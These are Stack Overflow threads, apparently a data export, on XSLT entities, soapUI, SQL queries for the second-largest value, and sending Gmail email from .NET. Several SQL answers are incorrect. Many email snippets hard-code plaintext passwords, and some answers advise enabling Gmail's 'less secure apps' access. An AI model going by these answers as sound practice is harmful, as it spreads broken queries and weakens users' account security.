<p>Yes, and the reason for that is that <code>&amp;nbsp;</code> is not a predefined entity in XML or XSLT as it is in HTML.</p>

<p>You could just use the unicode character which <code>&amp;nbsp;</code> stands for: <code>&amp;#160;</code></p>
 <p>one other possibility to use html entities from within xslt is the following one:</p>

<pre><code>&lt;xsl:text disable-output-escaping=""yes""&gt;&amp;amp;nbsp;&lt;/xsl:text&gt;
</code></pre>
 <p>XSLT only handles the five basic entities by default: <code>lt</code>, <code>gt</code>, <code>apos</code>, <code>quot</code>, and <code>amp</code>. All others need to be defined as <a href=""http://stackoverflow.com/questions/31870/using-a-html-entity-in-xslt-eg-nbsp#31873"" rel=""nofollow"">@Aku</a> mentions.</p>
 <p>Now that there's Unicode, it's generally counter-productive to use named character entities.  I would recommend using the Unicode character for a non-breaking space instead of an entity, just for that reason.  Alternatively, you could use the entity <code>&amp;#160</code>;, instead of the named entity.  Using named entities makes your XML dependent on an inline or external DTD.  </p>
 <p>
    
     
</p>

<p>One space character between text tags should be enough.</p>
 <p>It is also possible to extend the approach from 2nd part of <a href=""http://stackoverflow.com/questions/31870/using-a-html-entity-in-xslt-e-g-nbsp#31873"">aku's answer</a> and get all known character references available, like this:</p>

<pre><code>&lt;!DOCTYPE stylesheet [
  &lt;!ENTITY % w3centities-f PUBLIC ""-//W3C//ENTITIES Combined Set//EN//XML""
      ""http://www.w3.org/2003/entities/2007/w3centities-f.ent""&gt;
  %w3centities-f;
]&gt;
...
&lt;xsl:text&gt;&amp;nbsp;&amp;minus;30&amp;deg;&lt;/xsl:text&gt;
</code></pre>

<p>There is certain difference in the result as compared to <code>&lt;xsl:text disable-output-escaping=""yes""&gt;</code> approach. The latter one is going to produce string literals like <code>&amp;nbsp;</code> for all kinds of output, even for <code>&lt;xsl:output method=""text""&gt;</code>, and this may happen to be different from what you might wish... On the contrary, getting entities defined for XSLT template via <code>&lt;!DOCTYPE ... &lt;!ENTITY ...</code> will always produce output consistent with your <code>xsl:output</code> settings.</p>

<p>It may be wise then to use a local entity resolver to keep the XSLT engine from fetching character entity definitions from the Internet. JAXP or explicit Xalan-J users may need a patch for Xalan-J to use the resolver correctly. See my blog <a href=""http://s-n-ushakov.blogspot.com/2011/09/xslt-entities-java-xalan.html"">XSLT, entities, Java, Xalan...</a> for patch download and comments.</p>
 <p>Thank you for your information. I have written a short blog post based on what worked for me as I was doing XSLT transformation in a template of the <a href=""http://www.dynamicweb.com"" rel=""nofollow"">Dynamicweb CMS</a>.</p>

<p>The blog post is here: <a href=""http://www.netsi.dk/wordpress/index.php/2012/01/18/how-to-add-entities-to-xslt-templates/"" rel=""nofollow"">How to add entities to XSLT templates</a>.</p>

<p>/Sten Hougaard</p>
 <p>I found all of these solutions produced a Â character in the blank space.</p>

<p>Using <code>&lt;xsl:text&gt; &lt;/xsl:text&gt;</code> solved the problem for me; but <code>&lt;xsl:text&gt;#x20;&lt;/xsl:text&gt;</code> might work as well.</p>
 <p>It is necessary to use the entity  <strong>#x160;</strong></p>
 <p>I had no luck with the DOCTYPE approach from Aku.  </p>

<p>What worked for me in MSXML transforms on an Windows 2003 server, was</p>

<pre><code>    &lt;xsl:text disable-output-escaping=""yes""&gt;&amp;amp;#160;&lt;/xsl:text&gt;
</code></pre>

<p>Sort of a hybrid of the above.  Thanks Stackoverflow contributors!</p>
"
"Is soapUI the best web services testing tool/client/framework? <p>I have been working on a web services related project for about the last year.  Our team found <a href=""http://www.soapui.org"">soapUI</a> near the start of our project and we have been <em>mostly</em>(*) satisfied with it (the free version, that is).</p>

<p>My question is: are there other tools/clients/frameworks that you have used/currently use for web services testing and would recommend?</p>

<p>(*) There are some weird GUI glitches that appear once in a while.  As is mentioned by some of the answers, we attributed this to a memory leak.</p>
 <p>I use soapUI, and it's generally pretty good.  Be aware that it seems to leak memory, and eventually it will no longer save your project, so save regularly!</p>

<p>This is about the only hassle I have with it (other than the general ugliness that almost every Java application has!), and I can't live without it.</p>
 <p>There's an eclipse plugin that allows you to do web service discovery, testing, etc - see <a href=""http://www.eclipse.org/webtools/ws/"" rel=""nofollow"">Eclipse Web Services Tools</a>.</p>

<p>I think it's much better than SoapUI, at least on Mac OS X.</p>
 <p>Call it laziness but I kind of gave up looking a while after I found SoapUI - its not perfect (what is) but it does its job very well (especially given the price).</p>

<p>More importantly given that there is scripting to allow you to set up automated tests we're heading towards an investment in the product.</p>

<p>Might be nice if it was better on Windows (we do .NET development, mostly ASP.NET) but for the price... (-: </p>
 <p>We've been using SoapUI since 1.x (will soon be adopting 3.0 from 2.5.1) and are all happy.
It's much more stable when running with native LnF (File - Preferences - UI Settings - Native LF).
I know it's available as an Eclipse plugin as well, but last I tried I failed to find how to add JAR-files to it (i.e. bin/ext in the stand-alone variant).</p>
 <p>Here is one web based alternative - <a href=""http://WSDLBrowser.com"" rel=""nofollow"">http://WSDLBrowser.com</a></p>
 <p>I've released an open source project for generating web service requests and making calls.</p>

<p>Whether something is the best is pretty subjective but give the program a try and compare it for yourself </p>

<p>Download it at <a href=""http://drexyia.github.io/WsdlUI/"" rel=""nofollow"">http://drexyia.github.io/WsdlUI/</a></p>
"
"What is the simplest SQL Query to find the second largest value? <p>What is the simplest SQL query to find the second largest integer value in a specific column? </p>

<p>There are maybe duplicate values in the column.</p>
 <p>The easiest would be to get the second value from this result set in the application:</p>

<pre><code>SELECT DISTINCT value FROM Table ORDER BY value DESC LIMIT 2
</code></pre>

<p>But if you must select the second value using SQL, how about:</p>

<pre><code>SELECT MIN(value) FROM (SELECT DISTINCT value FROM Table ORDER BY value DESC LIMIT 2) AS t
</code></pre>
 <p>I suppose you can do something like:</p>

<pre><code>SELECT * FROM Table ORDER BY NumericalColumn DESC LIMIT 1 OFFSET 1
</code></pre>

<p>or</p>

<pre><code>SELECT * FROM Table ORDER BY NumericalColumn DESC LIMIT (1, 1)
</code></pre>

<p>depending on your database server. Hint: SQL Server doesn't do LIMIT.</p>
 <pre><code>SELECT MAX( col )
  FROM table
 WHERE col &lt; ( SELECT MAX( col )
                 FROM table )
</code></pre>
 <pre><code>select top 1 MyIntColumn from MyTable
where
 MyIntColumn &lt;&gt; (select top 1 MyIntColumn from MyTable order by MyIntColumn desc)
order by MyIntColumn desc
</code></pre>
 <p>This works in MS SQL:</p>

<pre><code>select max([COLUMN_NAME]) from [TABLE_NAME] where [COLUMN_NAME] &lt; 
 ( select max([COLUMN_NAME]) from [TABLE_NAME] )
</code></pre>
 <p>Something like this? I haven't tested it, though:</p>

<pre><code>select top 1 x
from (
  select top 2 distinct x 
  from y 
  order by x desc
) z
order by x
</code></pre>
 <p>In T-Sql there are two ways:</p>

<pre><code>--filter out the max
select max( col )
from [table]
where col &lt; ( 
    select max( col )
    from [table] )

--sort top two then bottom one
select top 1 col 
from (
    select top 2 col 
    from [table]
    order by col) topTwo
order by col desc 
</code></pre>

<p>In Microsoft SQL the first way is twice as fast as the second, even if the column in question is clustered.</p>

<p>This is because the sort operation is relatively slow compared to the table or index scan that the <code>max</code> aggregation uses.</p>

<p>Alternatively, in Microsoft SQL 2005 and above you can use the <code>ROW_NUMBER()</code> function:</p>

<pre><code>select col
from (
    select ROW_NUMBER() over (order by col asc) as 'rowNum', col
    from [table] ) withRowNum 
where rowNum = 2
</code></pre>
 <p>See <a href=""http://stackoverflow.com/questions/16568"" rel=""nofollow"">http://stackoverflow.com/questions/16568</a>.</p>

<p>Sybase SQL Anywhere supports:</p>

<pre><code>SELECT TOP 1 START AT 2 value from table ORDER BY value
</code></pre>
 <p>I see both some SQL Server specific and some MySQL specific solutions here, so you might want to clarify which database you need.  Though if I had to guess I'd say SQL Server since this is trivial in MySQL.</p>

<p>I also see some solutions that won't work because they fail to take into account the possibility for duplicates, so be careful which ones you accept.  Finally, I see a few that will work but that will make two complete scans of the table.  You want to make sure the 2nd scan is only looking at 2 values.</p>

<p>SQL Server (pre-2012):</p>

<pre><code>SELECT MIN([column]) AS [column]
FROM (
    SELECT TOP 2 [column] 
    FROM [Table] 
    GROUP BY [column] 
    ORDER BY [column] DESC
) a
</code></pre>

<p>MySQL:</p>

<pre><code>SELECT `column` 
FROM `table` 
GROUP BY `column` 
ORDER BY `column` 
DESC LIMIT 1,1
</code></pre>

<p><strong>Update:</strong></p>

<p>SQL Server 2012 now supports a much cleaner (and <a href=""http://en.wikipedia.org/wiki/SQL:2011""><em>standard</em></a>) OFFSET/FETCH syntax:</p>

<pre><code>SELECT TOP 2 [column] 
FROM [Table] 
GROUP BY [column] 
ORDER BY [column] DESC
OFFSET 1 ROWS
FETCH NEXT 1 ROWS ONLY;
</code></pre>
 <pre><code>select * from emp e where 3&gt;=(select count(distinct salary)
    from emp where s.salary&lt;=salary)
</code></pre>

<p>This query selects the maximum three salaries. If two emp get the same salary this does not affect the query.</p>
 <p>Using a correlated query:</p>

<pre><code>Select * from x x1 where 1 = (select count(*) from x where x1.a &lt; a)
</code></pre>
 <p>Tom, believe this will fail when there is more than one value returned in <code>select max([COLUMN_NAME]) from [TABLE_NAME]</code> section. i.e. where there are more than 2 values in the data set.</p>

<p>Slight modification to your query will work -</p>

<pre><code>select max([COLUMN_NAME]) from [TABLE_NAME] where [COLUMN_NAME] **IN** 
  ( select max([COLUMN_NAME]) from [TABLE_NAME] )
</code></pre>
 <pre><code>select max(COL_NAME) from TABLE_NAME where COL_NAME in 
    (select COL_NAME from TABLE_NAME where COL_NAME &lt; (select max(COL_NAME) from TABLE_NAME));
</code></pre>

<p>subquery returns all values other than the largest.
select the max value from the returned list.</p>
 <pre><code>select min(sal) from emp where sal in 
    (select TOP 2 (sal) from emp order by sal desc)
</code></pre>

<p>Note</p>

<p>sal is col name<br>
emp is table name</p>
 <pre><code>SELECT MAX(col) FROM table WHERE col NOT IN (SELECT MAX(col) FROM table);
</code></pre>
 <pre><code>select col_name
from (
    select dense_rank() over (order by col_name desc) as 'rank', col_name
    from table_name ) withrank 
where rank = 2
</code></pre>
 <pre><code>
select * from (select ROW_NUMBER() over (Order by Col_x desc) as Row, Col_1
    from table_1)as table_new tn inner join table_1 t1
    on tn.col_1 = t1.col_1
where row = 2
</code></pre>

<p>Hope this help to get the value for any row.....</p>
 <pre><code>SELECT 
    * 
FROM 
    table 
WHERE 
    column &lt; (SELECT max(columnq) FROM table) 
ORDER BY 
    column DESC LIMIT 1
</code></pre>
 <p>A very simple query to find the second largest value</p>

<pre><code>SELECT `Column` FROM `Table` ORDER BY `Column` DESC LIMIT 1,1;
</code></pre>
 <p>you can find the second largest value of column by using the following query</p>

<pre><code>SELECT *
FROM TableName a
WHERE
  2 = (SELECT count(DISTINCT(b.ColumnName))
       FROM TableName b WHERE
       a.ColumnName &lt;= b.ColumnName);
</code></pre>

<p>you can find more details on the following link</p>

<p><a href=""http://www.abhishekbpatel.com/2012/12/how-to-get-nth-maximum-and-minimun.html"">http://www.abhishekbpatel.com/2012/12/how-to-get-nth-maximum-and-minimun.html</a></p>
 <p>Query to find the 2nd highest number in a row- </p>

<pre><code>select Top 1 (salary) from XYZ
where Salary not in (select distinct TOP 1(salary) from XYZ order by Salary desc)
ORDER BY Salary DESC
</code></pre>

<p>By changing the highlighted <code>Top 1</code> to <code>TOP 2</code>,  <code>3</code> or <code>4</code> u can find the 3rd, 4th and 5th highest respectively.</p>
 <p>We can also make use of order by and top 1 element as follows:</p>

<pre><code>Select  top 1 col_name from table_name
where col_name &lt; (Select top 1 col_name from table_name order by col_name desc)
order by col_name desc 
</code></pre>
 <pre><code>SELECT * FROM EMP
WHERE salary=
        (SELECT MAX(salary) FROM EMP
           WHERE salary != (SELECT MAX(salary) FROM EMP)
        );
</code></pre>
 <p>This is an another way to find the second largest value of a column.Consider the table 'Student' and column 'Age'.Then the query is,</p>

<pre><code>select top 1 Age from Student where Age in(select distinct top 2 Age  from Student order by Age desc) order by Age asc
</code></pre>
 <p>It is the most esiest way:</p>

<pre><code>SELECT
      Column name
FROM
      Table name 
ORDER BY 
      Column name DESC
LIMIT 1,1
</code></pre>
 <p>Try:    </p>

<pre><code>select a.* ,b.* from 
(select * from (select ROW_NUMBER() OVER(ORDER BY fc_amount desc) SrNo1, fc_amount as amount1 From entry group by fc_amount) tbl where tbl.SrNo1 = 2) a
,
(select * from (select ROW_NUMBER() OVER(ORDER BY fc_amount asc) SrNo2, fc_amount as amount2  From entry group by fc_amount) tbl where tbl.SrNo2 =2) b
</code></pre>
 <pre><code>select * from [table] where (column)=(select max(column)from [table] where column &lt; (select max(column)from [table]))
</code></pre>
 <p>Use this query.</p>

<pre><code>SELECT MAX ( colname ) 
FROM Tablename 
where colname &lt; (
    SELECT MAX( colname ) 
    FROM Tablename)
</code></pre>
 <pre><code>select MAX(salary) as SecondMax from test where salary !=(select MAX(salary) from test)
</code></pre>
 <pre><code>select age from student group by id having age&lt;(select max(age) from student)order by age limit 1
</code></pre>
 <pre><code>SELECT MAX(Salary) FROM Employee WHERE Salary NOT IN (SELECT MAX(Salary) FROM Employee )
</code></pre>

<p>This query will return the maximum salary, from the result - which not contains maximum salary from overall table.</p>
 <p>Simplest of all</p>

<pre><code>select sal from salary order by sal desc limit 1 offset 1
</code></pre>
 <pre><code>select score 
from table 
where score = (select max(score)-1 from table)
</code></pre>
 <p><strong>Microsoft SQL Server - Using Two TOPs for the N-th highest value (aliased sub-query).</strong></p>

<p>To solve for the 2nd highest:</p>

<pre><code>SELECT TOP 1 q.* 
FROM (SELECT TOP 2 column_name FROM table_name ORDER BY column_name DESC) as q
ORDER BY column_name ASC;
</code></pre>

<p>Uses TOP twice, but requires an aliased sub-query. Essentially, the inner query takes the greatest 2 values in descending order, then the outer query flips in ascending order so that 2nd highest is now on top. The SELECT statement returns this top.</p>

<p>To solve for the n-th highest value modify the sub-query TOP value. For example:</p>

<pre><code>SELECT TOP 1 q.* 
FROM (SELECT TOP 5 column_name FROM table_name ORDER BY column_name DESC) as q
ORDER BY column_name;
</code></pre>

<p>Would return the 5th highest value.</p>
 <p>Old question I know, but this gave me a better exec plan:</p>

<pre><code> SELECT TOP 1 LEAD(MAX (column)) OVER (ORDER BY column desc)
 FROM TABLE 
 GROUP BY column
</code></pre>
 <pre><code>select extension from [dbo].[Employees] order by extension desc offset  2  rows fetch next  1 rows only
</code></pre>
"
"Sending email in .NET through Gmail <p>Instead of relying on my host to send email, I was thinking of sending the messages though my Gmail account. The emails are personalized emails to the bands I play on my show. Is it possible to do?</p>
 <p><a href=""http://www.systemnetmail.com/"">http://www.systemnetmail.com/</a> is probably the most absurdly complete site dedicated to a <em>single</em> .NET namespace...but it has EVERYTHING you could ever want to know about sending mail via .NET, be it ASP.NET or Desktop.</p>

<p><em><a href=""http://www.systemwebmail.com/"">http://www.systemwebmail.com/</a> was the original URL in the post, but should not be used for .NET 2.0 and above.</em></p>
 <p>Be sure to use <code>System.Net.Mail</code>, not the deprecated <code>System.Web.Mail</code>. Doing SSL with <code>System.Web.Mail</code> is a gross mess of hacky extensions.</p>

<pre><code>using System.Net;
using System.Net.Mail;

var fromAddress = new MailAddress(""from@gmail.com"", ""From Name"");
var toAddress = new MailAddress(""to@example.com"", ""To Name"");
const string fromPassword = ""fromPassword"";
const string subject = ""Subject"";
const string body = ""Body"";

var smtp = new SmtpClient
{
    Host = ""smtp.gmail.com"",
    Port = 587,
    EnableSsl = true,
    DeliveryMethod = SmtpDeliveryMethod.Network,
    UseDefaultCredentials = false,
    Credentials = new NetworkCredential(fromAddress.Address, fromPassword)
};
using (var message = new MailMessage(fromAddress, toAddress)
{
    Subject = subject,
    Body = body
})
{
    smtp.Send(message);
}
</code></pre>
 <p>The above answer doesn't work. You have to set <code>DeliveryMethod = SmtpDeliveryMethod.Network</code> or it will come back with a ""<strong>client was not authenticated</strong>"" error. Also it's always a good idea to put a timeout.</p>

<p>Revised code:</p>

<pre><code>using System.Net.Mail;
using System.Net;

var fromAddress = new MailAddress(""from@gmail.com"", ""From Name"");
var toAddress = new MailAddress(""to@yahoo.com"", ""To Name"");
const string fromPassword = ""password"";
const string subject = ""test"";
const string body = ""Hey now!!"";

var smtp = new SmtpClient
{
    Host = ""smtp.gmail.com"",
    Port = 587,
    EnableSsl = true,
    DeliveryMethod = SmtpDeliveryMethod.Network,
    Credentials = new NetworkCredential(fromAddress.Address, fromPassword),
    Timeout = 20000
};
using (var message = new MailMessage(fromAddress, toAddress)
{
    Subject = subject,
    Body = body
})
{
    smtp.Send(message);
}
</code></pre>
 <p>Here is my version: ""<a href=""http://www.techiespider.com/?p=7"" rel=""nofollow"">Send Email In C # Using Gmail</a>"".</p>

<pre><code>using System;
using System.Net;
using System.Net.Mail;

namespace SendMailViaGmail
{
   class Program
   {
   static void Main(string[] args)
   {

      //Specify senders gmail address
      string SendersAddress = ""Sendersaddress@gmail.com"";
      //Specify The Address You want to sent Email To(can be any valid email address)
      string ReceiversAddress = ""ReceiversAddress@yahoo.com"";
      //Specify The password of gmial account u are using to sent mail(pw of sender@gmail.com)
      const string SendersPassword = ""Password"";
      //Write the subject of ur mail
      const string subject = ""Testing"";
      //Write the contents of your mail
      const string body = ""Hi This Is my Mail From Gmail"";

      try
      {
        //we will use Smtp client which allows us to send email using SMTP Protocol
        //i have specified the properties of SmtpClient smtp within{}
        //gmails smtp server name is smtp.gmail.com and port number is 587
        SmtpClient smtp = new SmtpClient
        {
           Host = ""smtp.gmail.com"",
           Port = 587,
           EnableSsl = true,
           DeliveryMethod = SmtpDeliveryMethod.Network,
           Credentials    = new NetworkCredential(SendersAddress, SendersPassword),
           Timeout = 3000
        };

        //MailMessage represents a mail message
        //it is 4 parameters(From,TO,subject,body)

        MailMessage message = new MailMessage(SendersAddress, ReceiversAddress, subject, body);
        /*WE use smtp sever we specified above to send the message(MailMessage message)*/

        smtp.Send(message);
        Console.WriteLine(""Message Sent Successfully"");
        Console.ReadKey();
     }

     catch (Exception ex)
     {
        Console.WriteLine(ex.Message);
        Console.ReadKey();
     }
    }
   }
 }
</code></pre>
 <p>This is to send email with attachement.. Simple and short..</p>

<p>source: <a href=""http://coding-issues.blogspot.in/2012/11/sending-email-with-attachments-from-c.html"">http://coding-issues.blogspot.in/2012/11/sending-email-with-attachments-from-c.html</a></p>

<pre><code>using System.Net;
using System.Net.Mail;

public void email_send()
{
    MailMessage mail = new MailMessage();
    SmtpClient SmtpServer = new SmtpClient(""smtp.gmail.com"");
    mail.From = new MailAddress(""your mail@gmail.com"");
    mail.To.Add(""to_mail@gmail.com"");
    mail.Subject = ""Test Mail - 1"";
    mail.Body = ""mail with attachment"";

    System.Net.Mail.Attachment attachment;
    attachment = new System.Net.Mail.Attachment(""c:/textfile.txt"");
    mail.Attachments.Add(attachment);

    SmtpServer.Port = 587;
    SmtpServer.Credentials = new System.Net.NetworkCredential(""your mail@gmail.com"", ""your password"");
    SmtpServer.EnableSsl = true;

    SmtpServer.Send(mail);

}
</code></pre>
 <p><strong>Source</strong> : <a href=""http://yassershaikh.com/how-to-send-email-in-asp-net-c-mvc-3-with-sample-working-code/"">Send email in ASP.NET C#</a></p>

<p>Below is a sample working code for sending in a mail using C#, in the below example I am using google’s smtp server. </p>

<p>The code is pretty self explanatory, replace email and password with your email and password values.</p>

<pre><code>public void SendEmail(string address, string subject, string message)
{
    string email = ""yrshaikh.mail@gmail.com"";
    string password = ""put-your-GMAIL-password-here"";

    var loginInfo = new NetworkCredential(email, password);
    var msg = new MailMessage();
    var smtpClient = new SmtpClient(""smtp.gmail.com"", 587);

    msg.From = new MailAddress(email);
    msg.To.Add(new MailAddress(address));
    msg.Subject = subject;
    msg.Body = message;
    msg.IsBodyHtml = true;

    smtpClient.EnableSsl = true;
    smtpClient.UseDefaultCredentials = false;
    smtpClient.Credentials = loginInfo;
    smtpClient.Send(msg);
}
</code></pre>
 <p>Changing sender on Gmail / Outlook.com email:</p>

<p>To prevent spoofing - Gmail/Outlook.com won't let you send from an arbitrary user account name.</p>

<p>If you have a limited number of senders you can follow these instructions and then set the <code>From</code> field to this address: <a href=""http://support.google.com/a/bin/answer.py?hl=en&amp;answer=22370"" rel=""nofollow"">Sending mail from a different address</a></p>

<p>If you are wanting to send from an arbitrary email address (such as a feedback form on website where the user enters their email and you don't want them emailing you directly) about the best you can do is this :</p>

<pre><code>        msg.ReplyToList.Add(new System.Net.Mail.MailAddress(email, friendlyName));
</code></pre>

<p>This would let you just hit 'reply' in your email account to reply to the fan of your band on a feedback page, but they wouldn't get your actual email which would likely lead to a tonne of spam.</p>

<p>If you're in a controlled environment this works great, but please note that I've seen some email clients send to the from address even when reply-to is specified (I don't know which).</p>
 <p>If you want to send background email, then please do the below</p>

<pre><code> public void SendEmail(string address, string subject, string message)
 {
 Thread threadSendMails;
 threadSendMails = new Thread(delegate()
    {

      //Place your Code here 

     });
  threadSendMails.IsBackground = true;
  threadSendMails.Start();
}
</code></pre>

<p>and add namespace</p>

<pre><code>using System.Threading;
</code></pre>
 <p>Here is one method to send mail and getting credentials from web.config:</p>

<pre><code>public static string SendEmail(string To, string Subject, string Msg, bool bodyHtml = false, bool test = false, Stream AttachmentStream = null, string AttachmentType = null, string AttachmentFileName = null)
{
    try
    {
        System.Net.Mail.MailMessage newMsg = new System.Net.Mail.MailMessage(System.Configuration.ConfigurationManager.AppSettings[""mailCfg""], To, Subject, Msg);
        newMsg.BodyEncoding = System.Text.Encoding.UTF8;
        newMsg.HeadersEncoding = System.Text.Encoding.UTF8;
        newMsg.SubjectEncoding = System.Text.Encoding.UTF8;

        System.Net.Mail.SmtpClient smtpClient = new System.Net.Mail.SmtpClient();
        if (AttachmentStream != null &amp;&amp; AttachmentType != null &amp;&amp; AttachmentFileName != null)
        {
            System.Net.Mail.Attachment attachment = new System.Net.Mail.Attachment(AttachmentStream, AttachmentFileName);
            System.Net.Mime.ContentDisposition disposition = attachment.ContentDisposition;
            disposition.FileName = AttachmentFileName;
            disposition.DispositionType = System.Net.Mime.DispositionTypeNames.Attachment;

            newMsg.Attachments.Add(attachment);
        }
        if (test)
        {
            smtpClient.PickupDirectoryLocation = ""C:\\TestEmail"";
            smtpClient.DeliveryMethod = System.Net.Mail.SmtpDeliveryMethod.SpecifiedPickupDirectory;
        }
        else
        {
            //smtpClient.EnableSsl = true;
        }

        newMsg.IsBodyHtml = bodyHtml;
        smtpClient.Send(newMsg);
        return SENT_OK;
    }
    catch (Exception ex)
    {

        return ""Error: "" + ex.Message
             + ""&lt;br/&gt;&lt;br/&gt;Inner Exception: ""
             + ex.InnerException;
    }

}
</code></pre>

<p>And the corresponding section in web.config:</p>

<pre><code>&lt;appSettings&gt;
    &lt;add key=""mailCfg"" value=""yourmail@example.com""/&gt;
&lt;/appSettings&gt;
&lt;system.net&gt;
  &lt;mailSettings&gt;
    &lt;smtp deliveryMethod=""Network"" from=""yourmail@example.com""&gt;
      &lt;network defaultCredentials=""false"" host=""mail.exapmple.com"" userName=""yourmail@example.com"" password=""your_password"" port=""25""/&gt;
    &lt;/smtp&gt;
  &lt;/mailSettings&gt;
&lt;/system.net&gt;
</code></pre>
 <p>Include this,</p>

<pre><code>using System.Net.Mail;
</code></pre>

<p>And then,</p>

<pre><code>MailMessage sendmsg = new MailMessage(SendersAddress, ReceiversAddress, subject, body); 
SmtpClient client = new SmtpClient(""smtp.gmail.com"");

client.Port = Convert.ToInt16(""587"");
client.Credentials = new System.Net.NetworkCredential(""mail-id@gmail.com"",""password"");
client.EnableSsl = true;

client.Send(sendmsg);
</code></pre>
 <p>I hope this code will work fine. You can have a try.</p>

<pre><code>// Include this.                
using System.Net.Mail;

string fromAddress = ""xyz@gmail.com"";
string mailPassword = ""*****"";       // Mail id password from where mail will be sent.
string messageBody = ""Write the body of the message here."";


// Create smtp connection.
SmtpClient client = new SmtpClient();
client.Port = 587;//outgoing port for the mail.
client.Host = ""smtp.gmail.com"";
client.EnableSsl = true;
client.Timeout = 10000;
client.DeliveryMethod = SmtpDeliveryMethod.Network;
client.UseDefaultCredentials = false;
client.Credentials = new System.Net.NetworkCredential(fromAddress, mailPassword);


// Fill the mail form.
var send_mail = new MailMessage();

send_mail.IsBodyHtml = true;
//address from where mail will be sent.
send_mail.From = new MailAddress(""from@gmail.com"");
//address to which mail will be sent.           
send_mail.To.Add(new MailAddress(""to@example.com"");
//subject of the mail.
send_mail.Subject = ""put any subject here"";

send_mail.Body = messageBody;
client.Send(send_mail);
</code></pre>
 <p>For me to get it to work, i had to enable my gmail account making it possible for other apps to gain access. This is done with this link:
<a href=""https://accounts.google.com/b/0/DisplayUnlockCaptcha"">https://accounts.google.com/b/0/DisplayUnlockCaptcha</a></p>
 <p>Google may block sign in attempts from some apps or devices that do not use modern security standards. Since these apps and devices are easier to break into, blocking them helps keep your account safer.</p>

<p>Some examples of apps that do not support the latest security standards include:</p>

<ul>
<li>The Mail app on your iPhone or iPad with iOS 6 or below<br /></li>
<li>The Mail app on your Windows phone preceding the 8.1 release<br /></li>
<li>Some Desktop mail clients like Microsoft Outlook and Mozilla Thunderbird</li>
</ul>

<p>Therefore, you have to enable <b>Less Secure Sign-In</b> in your google account.</p>

<p>After sign into google account, go to:</p>

<p><a href=""https://www.google.com/settings/security/lesssecureapps"">https://www.google.com/settings/security/lesssecureapps</a></p>

<p>In C#, you can use the following code:</p>

<pre><code>using (MailMessage mail = new MailMessage())
{
    mail.From = new MailAddress(""email@gmail.com"");
    mail.To.Add(""somebody@domain.com"");
    mail.Subject = ""Hello World"";
    mail.Body = ""&lt;h1&gt;Hello&lt;/h1&gt;"";
    mail.IsBodyHtml = true;
    mail.Attachments.Add(new Attachment(""C:\\file.zip""));

    using (SmtpClient smtp = new SmtpClient(""smtp.gmail.com"", 587))
    {
        smtp.Credentials = new NetworkCredential(""email@gmail.com"", ""password"");
        smtp.EnableSsl = true;
        smtp.Send(mail);
    }
}
</code></pre>
 <p>The problem for me was that my <strong>password had a blackslash ""\""</strong> in it, which I copy pasted without realizing it would cause problems.</p>
 <p>I had the same issue, but it was resolved by going to gmail's security settings and <strong>Allowing Less Secure apps</strong>.
The Code from Domenic &amp; Donny works, but only if you enabled that setting</p>

<p>If you are signed in (to Google) you can follow <a href=""https://www.google.com/settings/security/lesssecureapps"" rel=""nofollow"">this</a> link and toggle <strong>""Turn on""</strong> for <strong>""Access for less secure apps""</strong></p>
 <p>use this way </p>

<pre><code>MailMessage sendmsg = new MailMessage(SendersAddress, ReceiversAddress, subject, body); 
SmtpClient client = new SmtpClient(""smtp.gmail.com"");

client.Port = Convert.ToInt32(""587"");
client.EnableSsl = true;
client.Credentials = new System.Net.NetworkCredential(""mail-id@gmail.com"",""MyPassWord"");
client.Send(sendmsg);
</code></pre>

<p>Don't forget this :</p>

<pre><code>using System.Net;
using System.Net.Mail;
</code></pre>
 <p>One Tip!
Check the sender inbox, maybe you need allow less secure apps.
See: <a href=""https://www.google.com/settings/security/lesssecureapps"" rel=""nofollow"">https://www.google.com/settings/security/lesssecureapps</a></p>
 <p><strong>Turn On Access for less secure apps</strong> in the gmail account.</p>

<p>Looks like recently google changed it's security policy. The top rated answer no longer works, until you change your account settings as described here: <a href=""https://support.google.com/accounts/answer/6010255?hl=en-GB"">https://support.google.com/accounts/answer/6010255?hl=en-GB</a><a href=""http://i.stack.imgur.com/ZyxRF.png""><img src=""http://i.stack.imgur.com/ZyxRF.png"" alt=""enter image description here""></a></p>

<p><a href=""http://i.stack.imgur.com/XqODf.png""><img src=""http://i.stack.imgur.com/XqODf.png"" alt=""enter image description here""></a></p>

<p><strong>As of March 2016, google changed the setting location again!</strong></p>
 <pre><code>using System;
using System.Net;
using System.Net.Mail;

namespace SendMailViaGmail
{
   class Program
   {
   static void Main(string[] args)
   {

      //Specify senders gmail address
      string SendersAddress = ""Sendersaddress@gmail.com"";
      //Specify The Address You want to sent Email To(can be any valid email address)
      string ReceiversAddress = ""ReceiversAddress@yahoo.com"";
      //Specify The password of gmial account u are using to sent mail(pw of sender@gmail.com)
      const string SendersPassword = ""Password"";
      //Write the subject of ur mail
      const string subject = ""Testing"";
      //Write the contents of your mail
      const string body = ""Hi This Is my Mail From Gmail"";

      try
      {
        //we will use Smtp client which allows us to send email using SMTP Protocol
        //i have specified the properties of SmtpClient smtp within{}
        //gmails smtp server name is smtp.gmail.com and port number is 587
        SmtpClient smtp = new SmtpClient
        {
           Host = ""smtp.gmail.com"",
           Port = 587,
           EnableSsl = true,
           DeliveryMethod = SmtpDeliveryMethod.Network,
           Credentials = new NetworkCredential(SendersAddress, SendersPassword),
           Timeout = 3000
        };

        //MailMessage represents a mail message
        //it is 4 parameters(From,TO,subject,body)

        MailMessage message = new MailMessage(SendersAddress, ReceiversAddress, subject, body);
        /*WE use smtp sever we specified above to send the message(MailMessage message)*/

        smtp.Send(message);
        Console.WriteLine(""Message Sent Successfully"");
        Console.ReadKey();
     }
     catch (Exception ex)
     {
        Console.WriteLine(ex.Message);
        Console.ReadKey();
     }
}
}
}
</code></pre>
 <p>Try this one </p>

<pre><code>public static bool Send(string receiverEmail, string ReceiverName, string subject, string body)
{
        MailMessage mailMessage = new MailMessage();
        MailAddress mailAddress = new MailAddress(""abc@gmail.com"", ""Sender Name""); // abc@gmail.com = input Sender Email Address 
        mailMessage.From = mailAddress;
        mailAddress = new MailAddress(receiverEmail, ReceiverName);
        mailMessage.To.Add(mailAddress);
        mailMessage.Subject = subject;
        mailMessage.Body = body;
        mailMessage.IsBodyHtml = true;

        SmtpClient mailSender = new SmtpClient(""smtp.gmail.com"", 587)
        {
            EnableSsl = true,
            UseDefaultCredentials = false,
            DeliveryMethod = System.Net.Mail.SmtpDeliveryMethod.Network,
            Credentials = new NetworkCredential(""abc@gmail.com"", ""pass"")   // abc@gmail.com = input sender email address  
                                                                           //pass = sender email password
        };

        try
        {
            mailSender.Send(mailMessage);
            return true;
        }
